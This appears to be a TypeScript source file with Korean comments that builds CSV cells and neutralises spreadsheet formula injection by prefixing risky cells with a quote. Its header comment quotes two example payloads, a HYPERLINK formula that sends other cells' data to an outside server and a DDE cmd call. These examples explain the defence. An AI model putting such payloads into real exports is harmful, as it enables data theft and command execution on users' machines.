/**
 * CSV 한 칸을 만드는 단일 출처.
 *
 * 내보낸 CSV 를 여는 곳은 대개 엑셀이다. 엑셀·LibreOffice·Google 시트는 `=`·`+`·`-`·`@`
 * (그리고 앞에 붙은 탭·캐리지리턴)로 시작하는 칸을 **값이 아니라 수식**으로 읽는다.
 * 우리 CSV 에는 상담창 방문자가 직접 친 글자(`message`)와 그 답변(`reply`), 감사 로그의
 * `target`·`detail`, 정산 비고가 그대로 들어간다 — 즉 **아무나 열 수 있는 공개 상담창**이
 * 운영자의 엑셀에 들어갈 수식의 입력란이다.
 *   =HYPERLINK("https://남의서버/?d="&A2,"확인")  → 같은 표의 다른 칸(연락처·대화 본문)을
 *                                                   주소에 실어 밖으로 내보낸다
 *   =cmd|'/c ...'!A0                              → DDE 로 외부 프로그램을 부른다
 * 따옴표 처리(RFC 4180)는 **구분자·줄바꿈을 지킬 뿐** 이것을 막지 못한다. `"=A1"` 도
 * 엑셀은 수식으로 읽는다. 앞에 작은따옴표를 세워 「이 칸은 글자」라고 못박는 것이 막는 길이다.
 *
 * 숫자는 건드리지 않는다: 금액 열의 음수(`-1200`)까지 따옴표를 세우면 합계가 서지 않는다.
 * 순수한 수(부호·소수점 포함)는 수식이 될 수 없으므로 그대로 둔다.
 */

/** 엑셀류가 수식의 시작으로 읽는 글자. 앞에 붙는 탭·캐리지리턴도 같은 취급이다. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
/** 부호·소수점만 있는 순수한 수 — 수식이 될 수 없다(음수 금액을 지키기 위한 예외). */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

/** 따옴표로 감싸야 하는가 — 구분자·따옴표·줄바꿈(RFC 4180). */
const NEEDS_QUOTE = /[",\n\r]/;

/**
 * 값 하나를 CSV 한 칸으로. `null`·`undefined` 는 빈 칸이다
 * (0 으로 채우면 받는 쪽이 "0원"으로 읽는다 — settlement 의 기존 규약).
 */
export function csvCell(v: string | number | boolean | null | undefined): string {
  if (v === null || v === undefined) return '';
  let s = String(v);
  if (FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;
  return NEEDS_QUOTE.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** 한 줄 = 칸들을 쉼표로. 줄 구분자는 부르는 쪽이 `\r\n` 으로 잇는다. */
export function csvRow(cells: readonly (string | number | boolean | null | undefined)[]): string {
  return cells.map(csvCell).join(',');
}
